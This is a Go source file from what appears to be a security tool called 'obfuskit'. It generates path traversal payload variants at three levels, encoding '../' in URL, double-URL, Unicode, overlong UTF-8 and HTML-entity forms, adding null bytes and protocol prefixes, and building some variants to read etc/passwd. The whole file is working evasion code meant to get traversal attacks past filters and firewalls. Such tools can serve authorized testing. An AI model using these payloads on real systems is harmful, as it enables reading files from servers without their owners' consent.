package path

import (
	"fmt"
	"math/rand"
	"obfuskit/cmd"
	"obfuskit/evasions"
	"strings"
)

// PathTraversalVariants generates various path traversal evasion techniques
// based on the specified obfuscation level
func PathTraversalVariants(path string, level cmd.Level) []string {
	var variants []string

	// Basic evasion techniques
	variants = append(variants,
		dotSlashPrepend(path),     // Adding ./ prefixes
		dotSlashVarying(path),     // Varying ./ and ../
		doubleSlashPadding(path),  // Using // instead of /
		urlEncoding(path),         // Basic URL encoding
		mixedEncoding(path),       // Mixed case and encoding
		slashBackslashMix(path),   // Mixing / and \
		nullByteInjection(path),   // Adding null bytes
		redundantDots(path),       // Adding redundant dots in paths
		caseVariation(path),       // Case variations where applicable
		nonReadableDirPaths(path), // Using non-readable directories
	)

	// Return basic variants if level is Basic
	if level == cmd.Basic {
		return evasions.UniqueStrings(variants)
	}

	// Medium level adds more complex techniques
	variants = append(variants,
		doubleUrlEncoding(path),       // Double URL encoding
		unicodeEncoding(path),         // Unicode encoding
		pathNormalization(path),       // Path normalization tricks
		selfReferencingDir(path),      // Using self-referencing directory
		repetitiveTraversal(path),     // Repetitive directory traversal
		environmentVarsInPath(path),   // Using environment variables
		directoryAliasing(path),       // Using directory aliases
		dotDotSeparation(path),        // Separating the dots in ../
		htmlEntityEncoding(path),      // HTML entity encoding
		multipleRepresentations(path), // Multiple character representations
	)

	// Return medium variants if level is Medium
	if level == cmd.Medium {
		return evasions.UniqueStrings(variants)
	}

	// Advanced level adds the most complex evasion techniques
	variants = append(variants,
		hexEncodedPath(path),           // Using hex encoding for path segments
		unicodeNormalization(path),     // Unicode normalization evasion
		percentUtf8Encoding(path),      // Percent-encoding UTF-8 sequences
		overLongUtf8(path),             // Over-long UTF-8 encoding
		nonStandardCharset(path),       // Non-standard charset encoding
		multiProtocolEvasion(path),     // Multiple protocol handlers
		fragmentIdentifiers(path),      // Using fragment identifiers
		parameterInjection(path),       // Parameter injection techniques
		mixedTraversalTechniques(path), // Mixed traversal techniques
		symbolLinkBased(path),          // Symbolic link based techniques
		stackedEncodingLayers(path),    // Multiple stacked encoding layers
	)

	return evasions.UniqueStrings(variants)
}

// Basic evasion techniques

func dotSlashPrepend(path string) string {
	// Add ./ at the beginning
	return "./" + path
}

func dotSlashVarying(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			if rand.Intn(2) == 0 {
				result += "./.."
			} else {
				result += part
			}
		} else if part != "" {
			if rand.Intn(3) == 0 {
				result += "./" + part
			} else {
				result += part
			}
		}
	}

	return result
}

func doubleSlashPadding(path string) string {
	// Replace single / with //
	return strings.ReplaceAll(path, "/", "//")
}

func urlEncoding(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			result += "%2e%2e"
		} else if part != "" {
			// URL encode only some characters
			encoded := ""
			for _, c := range part {
				if rand.Intn(3) == 0 {
					encoded += fmt.Sprintf("%%%02x", c)
				} else {
					encoded += string(c)
				}
			}
			result += encoded
		}
	}

	return result
}

func mixedEncoding(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Mix upper and lowercase encoding
			if rand.Intn(3) == 0 {
				result += "%2e%2E"
			} else if rand.Intn(2) == 0 {
				result += "%2E%2e"
			} else {
				result += "%2E%2E"
			}
		} else if part != "" {
			result += part
		}
	}

	return result
}

func slashBackslashMix(path string) string {
	result := ""
	for _, c := range path {
		if c == '/' && rand.Intn(2) == 0 {
			result += "\\"
		} else {
			result += string(c)
		}
	}
	return result
}

func nullByteInjection(path string) string {
	// Add null byte at the end for potential string termination issues
	return path + "%00"
}

func redundantDots(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Add redundant dots
			if rand.Intn(2) == 0 {
				result += "..."
			} else {
				result += "....."
			}
		} else if part != "" {
			result += part
		}
	}

	return result
}

func caseVariation(path string) string {
	// Change case for characters in the path
	// Most effective on Windows systems that are case-insensitive
	result := ""
	for _, c := range path {
		if (c >= 'a' && c <= 'z') && rand.Intn(2) == 0 {
			result += strings.ToUpper(string(c))
		} else if (c >= 'A' && c <= 'Z') && rand.Intn(2) == 0 {
			result += strings.ToLower(string(c))
		} else {
			result += string(c)
		}
	}
	return result
}

func nonReadableDirPaths(path string) string {
	// Insert non-readable directory references (such as /./), which get normalized
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			if rand.Intn(3) == 0 {
				result += "/./"
			} else {
				result += "/"
			}
		}

		result += part
	}

	return result
}

// Medium evasion techniques

func doubleUrlEncoding(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Double URL encode ..
			result += "%252e%252e"
		} else if part != "" {
			result += part
		}
	}

	return result
}

func unicodeEncoding(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Unicode encoding for dots
			result += "..%u2215" // Unicode forward slash
		} else if part != "" {
			// Unicode encode some characters
			encoded := ""
			for _, c := range part {
				if rand.Intn(3) == 0 && c < 127 {
					encoded += fmt.Sprintf("%%u%04x", c)
				} else {
					encoded += string(c)
				}
			}
			result += encoded
		}
	}

	return result
}

func pathNormalization(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Insert something that gets normalized away
			if rand.Intn(3) == 0 {
				result += "../x/../.."
			} else if rand.Intn(2) == 0 {
				result += "../././.."
			} else {
				result += "../"
			}
		} else if part != "" {
			result += part
		}
	}

	return result
}

func selfReferencingDir(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Use self-referencing directory
			if rand.Intn(2) == 0 {
				result += "./."
			}
			result += part
		} else if part != "" {
			result += part
		}
	}

	return result
}

func repetitiveTraversal(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Add redundant traversal that cancels out
			depth := 1 + rand.Intn(3)
			inserts := ""
			for j := 0; j < depth; j++ {
				inserts += "/x/.."
			}
			result += part + inserts
		} else if part != "" {
			result += part
		}
	}

	return result
}

func environmentVarsInPath(path string) string {
	// Use environment variables to construct part of the path
	if strings.Contains(path, "etc/passwd") {
		return "${HOME}/../../../etc/passwd"
	} else if strings.Contains(path, "etc") {
		return "${PWD}/../../../etc/" + strings.Split(path, "etc/")[1]
	}

	// If no recognized patterns, just return with a generic substitution
	return "${OLDPWD}/" + path
}

func directoryAliasing(path string) string {
	// Use directory aliases like ~ for /home/user
	if strings.HasPrefix(path, "../") {
		return "~/../" + strings.TrimPrefix(path, "../")
	}
	return path
}

func dotDotSeparation(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Separate the dots with something that gets ignored
			options := []string{
				".\\.",
				".%09.",
				".%0D.",
				".%0A.",
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			result += part
		}
	}

	return result
}

func htmlEntityEncoding(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			// Encode slash
			if rand.Intn(2) == 0 {
				result += "&#47;"
			} else {
				result += "/"
			}
		}

		if part == ".." {
			// HTML entity encode the dots
			result += "&#46;&#46;"
		} else if part != "" {
			encoded := ""
			for _, c := range part {
				if rand.Intn(3) == 0 {
					encoded += fmt.Sprintf("&#%d;", c)
				} else {
					encoded += string(c)
				}
			}
			result += encoded
		}
	}

	return result
}

func multipleRepresentations(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Different representations of ..
			options := []string{
				"%2e%2e",
				".%2e",
				"%2e.",
				"%252e%252e",
				"..;",
				"..#",
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			result += part
		}
	}

	return result
}

// Advanced evasion techniques

func hexEncodedPath(path string) string {
	// Convert entire path segments to hex representation
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part != "" {
			// Full hex encoding of path segment
			encoded := ""
			for _, c := range part {
				encoded += fmt.Sprintf("\\x%02x", c)
			}
			result += encoded
		}
	}

	return result
}

func unicodeNormalization(path string) string {
	// Use Unicode normalization form variations
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Use combining characters for dots
			result += ".\u0323." // dot + combining dot below
		} else if part != "" {
			result += part
		}
	}

	return result
}

func percentUtf8Encoding(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// UTF-8 encoding of dots
			result += "%c0%ae%c0%ae" // Overlong UTF-8 encoding
		} else if part != "" {
			result += part
		}
	}

	return result
}

func overLongUtf8(path string) string {
	// Overlong UTF-8 encoding
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			// UTF-8 overlong slash
			result += "%c0%af"
		}

		if part == ".." {
			// UTF-8 overlong encoding of dots
			result += "%c0%ae%c0%ae"
		} else if part != "" {
			result += part
		}
	}

	return result
}

func nonStandardCharset(path string) string {
	// Use non-standard charset encodings
	if strings.Contains(path, "../") {
		return strings.ReplaceAll(path, "../", "..%FE")
	}
	return path
}

func multiProtocolEvasion(path string) string {
	// Add fake protocol handler
	protocols := []string{
		"file:///",
		"jar:file:///",
		"jar:jar:file:///",
		"zip:file:///",
	}

	protocol := protocols[rand.Intn(len(protocols))]
	return protocol + strings.TrimPrefix(path, "/")
}

func fragmentIdentifiers(path string) string {
	// Add fragment identifiers
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part != "" {
			if rand.Intn(3) == 0 {
				result += part + "#" + randomString(3)
			} else {
				result += part
			}
		}
	}

	return result
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz"
	result := ""
	for i := 0; i < length; i++ {
		result += string(charset[rand.Intn(len(charset))])
	}
	return result
}

func parameterInjection(path string) string {
	// Add URL parameters to confuse parsers
	return path + "?x=" + randomString(5)
}

func mixedTraversalTechniques(path string) string {
	// Combine multiple techniques
	result := path

	// Apply multiple transformations
	transformations := []func(string) string{
		urlEncoding,
		slashBackslashMix,
		doubleSlashPadding,
	}

	for _, transform := range transformations {
		result = transform(result)
	}

	return result
}

func symbolLinkBased(path string) string {
	// Simulates symbolic link based traversal (in actual code this would be different)
	return "/dev/null/../" + path
}

func stackedEncodingLayers(path string) string {
	// Apply multiple layers of encoding
	result := path

	// Stack multiple encoding layers
	encodings := []func(string) string{
		urlEncoding,
		doubleUrlEncoding,
		unicodeEncoding,
	}

	// Apply a random number of encoding layers
	layers := 1 + rand.Intn(2)
	for i := 0; i < layers; i++ {
		transform := encodings[rand.Intn(len(encodings))]
		result = transform(result)
	}

	return result
}
